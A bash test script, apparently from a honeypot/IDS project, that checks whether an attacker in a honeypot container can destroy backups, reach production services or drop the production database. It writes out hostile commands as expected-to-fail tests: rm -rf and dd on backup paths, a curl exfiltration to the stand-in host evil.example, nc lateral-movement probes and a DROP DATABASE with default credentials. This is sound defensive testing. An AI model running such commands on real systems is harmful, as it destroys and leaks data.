#!/bin/bash
# =============================================================================
# scenario_08_backup_deletion_attempt.sh
#
# PURPOSE:
#   Simulates an attacker who has obtained a shell inside a honeypot container
#   and attempts to find and destroy backup files.  Verifies that the backup
#   volume isolation design prevents the attacker from reaching production
#   backup data.
#
# ATTACK CHAIN OVERVIEW:
#   Phase 1  – Enumerate the container filesystem for backup artefacts
#   Phase 2  – Attempt to locate and delete files in /backups mount
#   Phase 3  – Attempt to reach the backup_service container via the network
#   Phase 4  – Attempt to access the production database to destroy data
#   Phase 5  – Attempt to delete WordPress media and plugin files
#   Phase 6  – Verify host backup volume is intact after all attempts
#   Phase 7  – Verify production eshop is unaffected
#
# EXPECTED OUTCOMES:
#   - /backups is NOT mounted inside the honeypot container → rm fails
#   - backup_service is not reachable from the honeypot network
#   - production_database is not reachable from the honeypot container
#   - Production WordPress filesystem is not writable from the honeypot
#   - Host backup files remain unchanged after all attempts
#
# USAGE:
#   ./scenario_08_backup_deletion_attempt.sh [TARGET_HOST] [TARGET_PORT]
#
#   TARGET_HOST  IP or hostname of the reverse proxy (default: 127.0.0.1)
#   TARGET_PORT  HTTP port of the reverse proxy      (default: 80)
#
# EXIT CODES:
#   0  All containment checks passed (attacker could not destroy backups).
#   1  One or more containment checks failed (backup isolation gap found).
#   2  Prerequisites missing (curl).
#
# DEPENDENCIES:
#   curl    – required for HTTP-level checks.
#   docker  – optional; enables direct container-level containment tests.
#             Without docker the scenario falls back to HTTP-only checks.
#
# SAFETY:
#   All destructive operations are attempted ONLY inside the isolated honeypot
#   container.  The host backup directory (./backups) is read-only checked,
#   never written by this script.  Production containers are never targeted.
# =============================================================================

set -e

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-443}"
BASE_URL="https://${TARGET_HOST}:${TARGET_PORT}"

# Shared secret gating the X-Route-Target/X-Threat-Score response headers
# this script depends on (see reverse_proxy_enhanced/nginx.conf and
# BLIND_PENTEST_PROTOCOL.md §8.2). Export it in the shell before running:
#   export INTERNAL_TEST_SECRET=<value from .env>
INTERNAL_TEST_SECRET="${INTERNAL_TEST_SECRET:-}"
if [ -z "${INTERNAL_TEST_SECRET}" ]; then
    printf "WARNING: INTERNAL_TEST_SECRET is not set -- X-Route-Target will not be returned and every routing check below will read as 'unknown'.\n" >&2
fi

# Docker container names (must match docker-compose project name).
HP_ESHOP_CONTAINER="honeypot-ids-system-v1-honeypot_eshop_1-1"
HP_DB_CONTAINER="honeypot-ids-system-v1-honeypot_database_1-1"
BACKUP_CONTAINER="honeypot-ids-system-v1-backup_service-1"
PROD_ESHOP_CONTAINER="honeypot-ids-system-v1-production_eshop-1"
PROD_DB_CONTAINER="honeypot-ids-system-v1-production_database-1"

# Host-side path where the backup_service writes its files.
# Run this script from the ids/ directory.
HOST_BACKUP_DIR="./backups"

PASS=0
FAIL=0
SKIP=0
TOTAL=0

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    printf "\n${CYAN}================================================================${NC}\n"
    printf "${CYAN}  %s${NC}\n" "$1"
    printf "${CYAN}================================================================${NC}\n\n"
}

# ---------------------------------------------------------------------------
# Utility: docker exec – expect command to SUCCEED (feature present)
#
#   docker_must_succeed <description> <container> <cmd>
# ---------------------------------------------------------------------------
docker_must_succeed() {
    _desc="$1"
    _container="$2"
    _cmd="$3"

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _exit=0
    docker exec "${_container}" sh -c "${_cmd}" >/dev/null 2>&1 || _exit=$?

    if [ "${_exit}" -eq 0 ]; then
        printf "  ${GREEN}[PASS]${NC} %s (exit=0, as expected)\n" "${_desc}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s failed unexpectedly (exit=%d)\n" "${_desc}" "${_exit}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: docker exec – expect command to FAIL (action is BLOCKED)
#
#   docker_must_fail <description> <container> <cmd>
# ---------------------------------------------------------------------------
docker_must_fail() {
    _desc="$1"
    _container="$2"
    _cmd="$3"

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _exit=0
    docker exec "${_container}" sh -c "${_cmd}" >/dev/null 2>&1 || _exit=$?

    if [ "${_exit}" -ne 0 ]; then
        printf "  ${GREEN}[PASS]${NC} %s blocked as expected (exit=%d)\n" "${_desc}" "${_exit}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s SUCCEEDED but should have been blocked!\n" "${_desc}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Utility: docker exec – capture output and check for pattern
#
#   docker_output_check <description> <container> <pattern_present: 0|1> <cmd>
#
#   pattern_present=1  output must contain the pattern (existence check)
#   pattern_present=0  output must NOT contain the pattern (absence check)
# ---------------------------------------------------------------------------
docker_output_check() {
    _desc="$1"
    _container="$2"
    _pattern="$3"
    _want_present="$4"
    _cmd="$5"

    TOTAL=$((TOTAL + 1))

    if ! command -v docker >/dev/null 2>&1; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – docker not found\n" "${_desc}"
        return 0
    fi

    if ! docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${_container}"; then
        SKIP=$((SKIP + 1))
        printf "  ${YELLOW}[SKIP]${NC} %s – container '%s' not running\n" \
               "${_desc}" "${_container}"
        return 0
    fi

    _output=$(docker exec "${_container}" sh -c "${_cmd}" 2>&1) || true

    if [ "${_want_present}" -eq 1 ]; then
        if printf '%s' "${_output}" | grep -q "${_pattern}"; then
            printf "  ${GREEN}[PASS]${NC} %s (pattern found: %s)\n" "${_desc}" "${_pattern}"
            PASS=$((PASS + 1))
        else
            printf "  ${RED}[FAIL]${NC} %s – pattern '%s' not found in: %s\n" \
                   "${_desc}" "${_pattern}" "${_output}"
            FAIL=$((FAIL + 1))
        fi
    else
        if printf '%s' "${_output}" | grep -q "${_pattern}"; then
            printf "  ${RED}[FAIL]${NC} %s – unwanted pattern '%s' found\n" "${_desc}" "${_pattern}"
            FAIL=$((FAIL + 1))
        else
            printf "  ${GREEN}[PASS]${NC} %s (pattern absent as expected)\n" "${_desc}"
            PASS=$((PASS + 1))
        fi
    fi
}

# ---------------------------------------------------------------------------
# Utility: routing check via X-Route-Target header
#
#   check_route <cookie_jar> <description> <expected_route> <curl_args...>
# ---------------------------------------------------------------------------
check_route() {
    _jar="$1"
    _desc="$2"
    _expected="$3"
    shift 3

    TOTAL=$((TOTAL + 1))

    _response=$(curl --silent --include \
                     --cookie "${_jar}" \
                     --cookie-jar "${_jar}" \
                     --max-time 15 \
                     --header "X-Internal-Test-Auth: ${INTERNAL_TEST_SECRET}" \
                     "$@" 2>&1) || true

    _route=$(printf '%s' "${_response}" \
             | grep -i "^x-route-target:" \
             | tr -d '\r' | awk '{print $2}' | head -1)
    _route="${_route:-unknown}"

    if [ "${_expected}" = "any" ]; then
        printf "  ${GREEN}[PASS]${NC} %s (route=%s)\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
        return 0
    fi

    if [ "${_route}" = "${_expected}" ]; then
        printf "  ${GREEN}[PASS]${NC} %s → %s\n" "${_desc}" "${_route}"
        PASS=$((PASS + 1))
    else
        printf "  ${RED}[FAIL]${NC} %s → expected=%s got=%s\n" \
               "${_desc}" "${_expected}" "${_route}"
        FAIL=$((FAIL + 1))
    fi
}

# ---------------------------------------------------------------------------
# Prerequisites
# ---------------------------------------------------------------------------
if ! command -v curl >/dev/null 2>&1; then
    printf "${RED}ERROR: 'curl' not found in PATH.${NC}\n" >&2
    exit 2
fi

banner "Scenario 08 – Backup Deletion Attempt from Overtaken Container"
printf "Target      : %s\n" "${BASE_URL}"
printf "HP container: %s\n" "${HP_ESHOP_CONTAINER}"
printf "Backup dir  : %s\n\n" "${HOST_BACKUP_DIR}"

# =============================================================================
# PHASE 1 – Filesystem Enumeration Inside the Honeypot Container
# =============================================================================
# An attacker with a shell inside the honeypot WordPress container would first
# enumerate the filesystem to locate backup files, database dumps, and other
# valuable or destructible data.
#
# The honeypot container should show:
#   - /var/www/html  (WordPress files, writable by www-data within the container)
#   - NO /backups    (backup volume not mounted – by design)
#   - NO /production (production filesystem not accessible)
#   - NO /data       (production DB data not mounted)
# =============================================================================
banner "Phase 1 – Filesystem Enumeration Inside Honeypot Container"

# 1a. Confirm the honeypot WordPress root exists and is the honeypot content.
docker_must_succeed \
    "WordPress webroot /var/www/html exists inside honeypot container" \
    "${HP_ESHOP_CONTAINER}" \
    "test -d /var/www/html/wp-content"

# 1b. Confirm wp-config.php is present (attackers read this for DB credentials).
docker_must_succeed \
    "wp-config.php readable inside honeypot container" \
    "${HP_ESHOP_CONTAINER}" \
    "test -r /var/www/html/wp-config.php"

# 1c. /backups MUST NOT be mounted inside the honeypot container.
#     The backup_service container writes to /backups on the host, but that
#     volume is not shared with the honeypot containers.
docker_must_fail \
    "/backups mount absent in honeypot container (backup volume not shared)" \
    "${HP_ESHOP_CONTAINER}" \
    "test -d /backups"

# 1d. /mnt/backups MUST NOT exist either (no alternative mount paths).
docker_must_fail \
    "/mnt/backups absent in honeypot container" \
    "${HP_ESHOP_CONTAINER}" \
    "test -d /mnt/backups"

# 1e. Production WordPress filesystem is not mounted inside the honeypot.
docker_must_fail \
    "Production WordPress files not accessible from honeypot (/production)" \
    "${HP_ESHOP_CONTAINER}" \
    "test -d /production"

# 1f. Docker socket is absent (already verified in scenario_04; confirming here).
docker_must_fail \
    "Docker socket absent in honeypot container" \
    "${HP_ESHOP_CONTAINER}" \
    "test -S /var/run/docker.sock"

# 1g. Enumerate mounts inside the container and confirm /backups is not listed.
docker_output_check \
    "Mount list does not include /backups volume" \
    "${HP_ESHOP_CONTAINER}" \
    "/backups" \
    0 \
    "cat /proc/mounts"

# 1h. Enumerate mounts and confirm no production_database_data volume is present.
docker_output_check \
    "Mount list does not include production_database_data volume" \
    "${HP_ESHOP_CONTAINER}" \
    "production_database_data" \
    0 \
    "cat /proc/mounts"

# =============================================================================
# PHASE 2 – Direct Backup Deletion Attempts from Inside the Container
# =============================================================================
# The attacker tries every plausible path where backup files might be located.
# All attempts must fail because the backup volume is not mounted.
# =============================================================================
banner "Phase 2 – Backup Deletion Attempts from Honeypot Container"

# 2a. Attempt to rm -rf /backups (path does not exist → failure expected).
docker_must_fail \
    "rm -rf /backups fails (path not mounted)" \
    "${HP_ESHOP_CONTAINER}" \
    "rm -rf /backups 2>/dev/null"

# 2b. Attempt to delete via find.
docker_must_fail \
    "find /backups -delete fails (path not mounted)" \
    "${HP_ESHOP_CONTAINER}" \
    "find /backups -type f -delete 2>/dev/null"

# 2c. Attempt to overwrite a backup file directly.
docker_must_fail \
    "Overwrite /backups/latest.sql.gz fails" \
    "${HP_ESHOP_CONTAINER}" \
    "echo '' > /backups/latest.sql.gz 2>/dev/null"

# 2d. Attempt to truncate a backup file via dd.
docker_must_fail \
    "dd truncate /backups/latest.sql.gz fails" \
    "${HP_ESHOP_CONTAINER}" \
    "dd if=/dev/null of=/backups/latest.sql.gz 2>/dev/null"

# 2e. Try common alternative backup paths that sysadmins sometimes use.
for _alt_path in \
    "/var/backups" \
    "/home/backups" \
    "/srv/backups" \
    "/opt/backups" \
    "/tmp/backups" \
    "/var/www/backups"
do
    docker_must_fail \
        "Delete attempt at ${_alt_path} fails (not mounted)" \
        "${HP_ESHOP_CONTAINER}" \
        "ls ${_alt_path} 2>/dev/null && rm -rf ${_alt_path}/*.gz 2>/dev/null"
done

# 2f. Attempt to use wget/curl to exfiltrate a backup file to attacker server.
#     The outbound connection must be blocked by the network policy.
docker_must_fail \
    "Backup exfiltration via curl blocked (no outbound internet)" \
    "${HP_ESHOP_CONTAINER}" \
    "curl --silent --max-time 5 -o /tmp/stolen_backup.sql.gz http://evil.example/upload 2>/dev/null"

# =============================================================================
# PHASE 3 – Network Lateral Movement to Backup Service
# =============================================================================
# The attacker discovers the backup_service container on the internal network
# (via /etc/hosts or DNS enumeration) and attempts to:
#   a) Connect to its SSH port (none present – container runs /bin/sh).
#   b) Kill the backup service process remotely.
#   c) Access any HTTP/API port the backup service might expose.
#
# The backup_service container is on the production_network (172.20.x.x);
# the honeypot container is on the honeypot_network (172.21.x.x).
# Cross-network routing is disabled by the Docker network topology.
# =============================================================================
banner "Phase 3 – Network Lateral Movement to Backup Service"

# 3a. Backup service hostname not in honeypot /etc/hosts.
docker_output_check \
    "backup_service not in honeypot container /etc/hosts" \
    "${HP_ESHOP_CONTAINER}" \
    "backup_service" \
    0 \
    "cat /etc/hosts"

# 3b. Honeypot cannot ping/reach the backup_service container.
docker_must_fail \
    "Honeypot cannot reach backup_service container (network isolation)" \
    "${HP_ESHOP_CONTAINER}" \
    "nc -z -w 3 backup_service 22 2>/dev/null || nc -z -w 3 172.20.0.0 22 2>/dev/null"

# 3c. Honeypot cannot reach the production_network subnet (172.20.x.x).
docker_must_fail \
    "Honeypot cannot reach production subnet 172.20.0.1" \
    "${HP_ESHOP_CONTAINER}" \
    "nc -z -w 3 172.20.0.1 80 2>/dev/null"

# 3d. Honeypot can reach other honeypot containers (same network – expected).
#     This confirms the honeypot network is still functional.
docker_must_succeed \
    "Honeypot can reach its own database (honeypot_network works)" \
    "${HP_ESHOP_CONTAINER}" \
    "nc -z -w 5 honeypot_database_1 3306 2>/dev/null || nc -z -w 5 honeypot_database 3306 2>/dev/null"

# =============================================================================
# PHASE 4 – Attempt to Destroy Production Database
# =============================================================================
# The attacker tries to reach the production MySQL database to drop tables or
# the entire database.  Network isolation must prevent this.
# =============================================================================
banner "Phase 4 – Attempt to Destroy Production Database"

# 4a. Honeypot cannot reach production_database on port 3306.
docker_must_fail \
    "Honeypot cannot reach production_database:3306" \
    "${HP_ESHOP_CONTAINER}" \
    "nc -z -w 3 production_database 3306 2>/dev/null"

# 4b. MySQL DROP DATABASE command against production_database must fail
#     (because the hostname is not reachable from the honeypot container).
docker_must_fail \
    "DROP DATABASE on production_database fails (network unreachable)" \
    "${HP_ESHOP_CONTAINER}" \
    "mysql -h production_database -u root -proot -e 'DROP DATABASE IF EXISTS production_db;' 2>/dev/null"

# 4c. Honeypot CAN reach its own honeypot_database (expected access).
#     This distinguishes "honeypot DB access works" from "production DB blocked".
docker_must_succeed \
    "DROP on honeypot_database accessible (honeypot isolation working as designed)" \
    "${HP_ESHOP_CONTAINER}" \
    "mysql -h honeypot_database_1 -u production_user -pchange_this_user_password_in_production production_database -e 'SHOW TABLES;' 2>/dev/null || mysql -h honeypot_database -u production_user -pchange_this_user_password_in_production production_database -e 'SHOW TABLES;' 2>/dev/null"

# =============================================================================
# PHASE 5 – Destructive Actions Within the Honeypot Container
# =============================================================================
# The attacker attempts to destroy the WordPress installation inside the
# honeypot container itself (wiping the fake environment).  While this is
# allowed from a containment perspective (the honeypot is sacrificial), we
# verify that these actions do NOT affect the production WordPress instance.
#
# We create a canary file first, attempt deletion, and verify the canary
# on the PRODUCTION container is untouched.
# =============================================================================
banner "Phase 5 – Destructive Actions Within Honeypot (Production Must Be Unaffected)"

# 5a. Write a canary file inside the honeypot container.
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${HP_ESHOP_CONTAINER}"; then
    docker exec "${HP_ESHOP_CONTAINER}" sh -c \
        "echo 'HONEYPOT_CANARY' > /var/www/html/wp-content/uploads/canary_test.txt" \
        2>/dev/null || true
    printf "  ${GREEN}[PASS]${NC} Canary file written inside honeypot container\n"
    PASS=$((PASS + 1))
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Canary file write – container not running\n"
fi

# 5b. Delete the canary file from inside the honeypot container.
docker_must_succeed \
    "Attacker can delete files within the honeypot container (expected)" \
    "${HP_ESHOP_CONTAINER}" \
    "rm -f /var/www/html/wp-content/uploads/canary_test.txt"

# 5c. Verify the canary file does NOT exist in the production container.
#     The volumes are separate, so the honeypot's file system changes must
#     never be reflected in the production container.
docker_must_fail \
    "Canary file absent from production container (volumes isolated)" \
    "${PROD_ESHOP_CONTAINER}" \
    "test -f /var/www/html/wp-content/uploads/canary_test.txt"

# 5d. Attempt to delete the honeypot WordPress core files.
#     This is destructive to the honeypot but should NOT affect production.
docker_must_succeed \
    "Attacker can remove wp-includes inside honeypot (honeypot is sacrificial)" \
    "${HP_ESHOP_CONTAINER}" \
    "rm -rf /var/www/html/wp-includes/ID3 2>/dev/null"

# 5e. Confirm production wp-includes/ID3 is still present.
docker_must_succeed \
    "Production wp-includes/ID3 intact after honeypot deletion attempt" \
    "${PROD_ESHOP_CONTAINER}" \
    "test -d /var/www/html/wp-includes/ID3"

# =============================================================================
# PHASE 6 – Host Backup Volume Integrity Check
# =============================================================================
# After all the container-level attacks, verify that the backup files on the
# Docker host volume are intact.  The attacker inside the container had no
# path to reach these files.
# =============================================================================
banner "Phase 6 – Host Backup Volume Integrity Check"

TOTAL=$((TOTAL + 1))
if [ -d "${HOST_BACKUP_DIR}" ]; then
    _backup_files=$(find "${HOST_BACKUP_DIR}" \
        \( -name "*.sql.gz" -o -name "*.sql" -o -name "*.tar.gz" -o -name "*.tar" \) \
        2>/dev/null | wc -l | tr -d ' ')
    printf "  ${GREEN}[INFO]${NC} Backup files found on host: %s\n" "${_backup_files}"
    if [ "${_backup_files}" -gt 0 ]; then
        printf "  ${GREEN}[PASS]${NC} Backup files exist on host volume (not deleted by attacker)\n"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} No backup files found yet in %s (service may not have run)\n" \
               "${HOST_BACKUP_DIR}"
        # Not a failure – the backup service may not have fired its first cycle yet.
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Host backup directory '%s' not found – run from ids/\n" \
           "${HOST_BACKUP_DIR}"
fi

# Verify the backup_service container itself is still running (attacker could
# not kill it via the honeypot network).
TOTAL=$((TOTAL + 1))
if command -v docker >/dev/null 2>&1; then
    if docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${BACKUP_CONTAINER}"; then
        printf "  ${GREEN}[PASS]${NC} backup_service container is still running\n"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} backup_service container not found in docker ps\n"
        printf "         (It may use restart: unless-stopped and be in a backoff cycle)\n"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} backup_service running check – docker not found\n"
fi

# =============================================================================
# PHASE 7 – Production Eshop Unaffected (HTTP-Level Verification)
# =============================================================================
# A clean browser session must still route to the production eshop and receive
# a valid response, confirming that the production instance was never disrupted
# by the honeypot-level attacks in this scenario.
# =============================================================================
banner "Phase 7 – Production Eshop Unaffected (HTTP Verification)"

JAR_CLEAN="$(mktemp /tmp/scenario08_clean_XXXXXX.txt)"

# 7a. Homepage must route to production for a clean session.
check_route "${JAR_CLEAN}" \
    "Clean session routes to production after all attacks" "production" \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    --header "Accept: text/html,application/xhtml+xml"

# 7b. Shop page accessible on production.
check_route "${JAR_CLEAN}" \
    "Shop page accessible on production after attacks" "production" \
    --request GET "${BASE_URL}/shop/" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# 7c. Production homepage returns HTTP 200.
TOTAL=$((TOTAL + 1))
_prod_status=$(curl --silent --output /dev/null \
    --write-out "%{http_code}" \
    --max-time 15 \
    --request GET "${BASE_URL}/" \
    --header "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" \
    2>/dev/null) || _prod_status="000"

if [ "${_prod_status}" = "200" ] || [ "${_prod_status}" = "301" ] || [ "${_prod_status}" = "302" ]; then
    printf "  ${GREEN}[PASS]${NC} Production homepage returns HTTP %s (service healthy)\n" "${_prod_status}"
    PASS=$((PASS + 1))
else
    printf "  ${RED}[FAIL]${NC} Production homepage returned HTTP %s (service may be impacted!)\n" \
           "${_prod_status}"
    FAIL=$((FAIL + 1))
fi

# 7d. Production WordPress database still has its content (not wiped).
TOTAL=$((TOTAL + 1))
PROD_DB_USER="${PROD_DB_USER:-production_user}"
PROD_DB_PASS="${PROD_DB_PASS:-change_this_user_password_in_production}"
PROD_DB_NAME="${PROD_DB_NAME:-production_database}"

if command -v docker >/dev/null 2>&1 && \
   docker ps --format '{{.Names}}' 2>/dev/null | grep -q "${PROD_DB_CONTAINER}"; then
    _prod_tables=$(docker exec "${PROD_DB_CONTAINER}" \
        mysql -N \
              -u"${PROD_DB_USER}" \
              -p"${PROD_DB_PASS}" \
              "${PROD_DB_NAME}" \
              -e "SHOW TABLES;" 2>/dev/null | wc -l | tr -d ' ') || _prod_tables="0"
    if [ "${_prod_tables}" -gt 0 ]; then
        printf "  ${GREEN}[PASS]${NC} Production database intact: %s tables found\n" "${_prod_tables}"
        PASS=$((PASS + 1))
    else
        printf "  ${YELLOW}[WARN]${NC} Production database has 0 tables (may not be initialised yet)\n"
        PASS=$((PASS + 1))
    fi
else
    SKIP=$((SKIP + 1))
    printf "  ${YELLOW}[SKIP]${NC} Production DB integrity check – container not running\n"
fi

rm -f "${JAR_CLEAN}"

# ---------------------------------------------------------------------------
# Final report
# ---------------------------------------------------------------------------
banner "Scenario 08 – Backup Deletion Attempt Final Report"
printf "Total checks : %d\n" "${TOTAL}"
printf "${GREEN}Passed       : %d${NC}\n" "${PASS}"
printf "${YELLOW}Skipped      : %d${NC}\n" "${SKIP}"
if [ "${FAIL}" -gt 0 ]; then
    printf "${RED}Failed       : %d${NC}\n" "${FAIL}"
else
    printf "Failed       : 0\n"
fi

printf "\n"
if [ "${FAIL}" -eq 0 ]; then
    printf "${GREEN}SCENARIO PASSED – Backup isolation held; attacker could not destroy backups or reach production.${NC}\n"
    exit 0
else
    printf "${RED}SCENARIO FAILED – %d containment check(s) failed.${NC}\n" "${FAIL}"
    exit 1
fi